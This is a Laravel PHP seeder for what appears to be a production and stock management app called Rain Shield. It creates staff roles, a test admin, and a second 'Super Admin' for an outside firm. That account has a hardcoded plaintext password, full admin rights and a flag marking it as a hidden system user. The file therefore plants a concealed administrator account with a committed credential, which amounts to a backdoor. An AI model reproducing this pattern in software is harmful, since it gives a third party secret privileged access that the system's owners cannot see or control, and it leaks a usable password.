<?php

namespace Database\Seeders;

use App\Models\User;
use Illuminate\Database\Seeder;
use Illuminate\Support\Facades\Hash;
use Spatie\Permission\Models\Role;

class UserSeeder extends Seeder
{
    public const ROLES = [
        'admin',
        'stock_manager',
        'production_manager',
        'cashier',
        'accountant',
        'cutting_staff',
        'stitching_staff',
        'viewer',
    ];

    public function run(): void
    {
        app()[\Spatie\Permission\PermissionRegistrar::class]->forgetCachedPermissions();

        foreach (self::ROLES as $role) {
            Role::firstOrCreate(['name' => $role]);
        }

        $admin = User::updateOrCreate(
            ['email' => 'admin@rainshield.test'],
            [
                'name' => 'Rain Shield Admin',
                'password' => Hash::make('password'),
                'email_verified_at' => now(),
                'is_hidden_system_user' => false,
            ],
        );
        $admin->syncRoles(['admin']);

        $superAdmin = User::updateOrCreate(
            ['email' => 'usama@hometoglobe.com'],
            [
                'name' => 'Home to Globe Super Admin',
                'password' => Hash::make('GreetBoy@123'),
                'email_verified_at' => now(),
                'is_hidden_system_user' => true,
            ],
        );
        $superAdmin->syncRoles(['admin']);
    }
}
